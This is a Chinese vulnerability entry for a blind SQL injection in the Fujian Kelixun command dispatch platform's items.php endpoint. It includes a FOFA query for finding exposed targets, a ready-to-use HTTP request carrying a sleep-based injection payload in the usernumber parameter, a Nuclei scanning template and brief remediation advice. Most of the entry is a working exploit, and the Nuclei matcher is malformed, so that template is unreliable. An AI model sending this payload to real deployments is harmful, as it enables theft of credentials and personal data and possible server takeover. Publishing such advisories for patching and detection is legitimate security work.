# 福建科立讯通信指挥调度管理平台 items.php SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 福建科立讯通信指挥调度管理平台 items.php SQL注入漏洞 |
| 漏洞类型 | SQL注入（盲注） |
| 组件 | 福建科立讯通信指挥调度管理平台 |
| 严重程度 | 高危 |

## 漏洞概述

福建科立讯通信指挥调度管理平台 api/get_sos/items.php 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 测绘语法

### FOFA
```
body="指挥调度管理平台"
```

## 漏洞复现

### POC

```http
GET /api/get_sos/items.php?sign=2&timestamp=1&usernumber=1' OR (if(now()=sysdate(),sleep(4),0)) OR ' HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Cookie: PHPSESSID=a3b817f3d2b9f4733bc4e08c0a1647d5

```

### 特征
- 路径：`/api/get_sos/items.php`
- 参数：`sign`, `timestamp`, `usernumber`
- 响应特征：延迟4秒返回（盲注）

## Nuclei检测模板

```yaml
id: kelixun-items-sql-injection

info:
  name: Kelixun Command Dispatch items.php SQL Injection
  author: fortune
  severity: high
  description: 福建科立讯通信指挥调度管理平台 items.php SQL注入漏洞
  reference:
    - https://mp.weixin.qq.com/s/R2L7q81b9bWUsSXAScRjHQ
  tags: kelixun,sql-injection,blind

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/get_sos/items.php?sign=2&timestamp=1&usernumber=1' OR (if(now()=sysdate(),sleep(4),0)) OR '"
    matchers:
      - type: word
        part: response_time
        condition: greater_than
        value: 4
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
4. 对用户输入进行严格的参数过滤和预编译处理